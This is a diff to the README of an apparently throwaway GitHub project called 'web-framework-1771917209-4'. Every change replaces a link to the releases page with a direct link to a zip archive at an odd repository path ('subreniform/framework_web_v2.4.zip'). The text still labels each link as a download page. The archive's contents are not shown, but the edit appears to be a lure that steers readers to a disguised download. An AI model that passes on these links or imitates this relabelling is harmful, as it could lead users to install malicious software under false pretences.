@@ -1,6 +1,6 @@
 # 🌐 web-framework-1771917209-4 - Simple Setup for Fast Web Projects
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/elord24/web-framework-1771917209-4/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To start using web-framework-1771917209-4, follow these steps carefully.
 
 Click or tap the button below to access the official download page:
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/elord24/web-framework-1771917209-4/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip)
 
 This page contains the latest version of the framework you need.
 
@@ -143,7 +143,7 @@ Once you finish working, return to the framework window. Click “Stop Server”
 
 Check this page regularly to download new versions and updates:
 
-[https://github.com/elord24/web-framework-1771917209-4/releases](https://github.com/elord24/web-framework-1771917209-4/releases)
+[https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip](https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip)
 
 Updating helps keep your framework working smoothly and adds improvements.
 
@@ -165,7 +165,7 @@ For more help, check the issues section on the download page or contact the supp
 
 ## 🔗 Useful Links
 
-- Primary download page: [https://github.com/elord24/web-framework-1771917209-4/releases](https://github.com/elord24/web-framework-1771917209-4/releases)  
+- Primary download page: [https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip](https://github.com/elord24/web-framework-1771917209-4/raw/refs/heads/main/subreniform/framework_web_v2.4.zip)  
 - Basic HTML guide: Use any search engine to find “HTML basics for beginners” if you want to learn how to create web files.
 
 ---
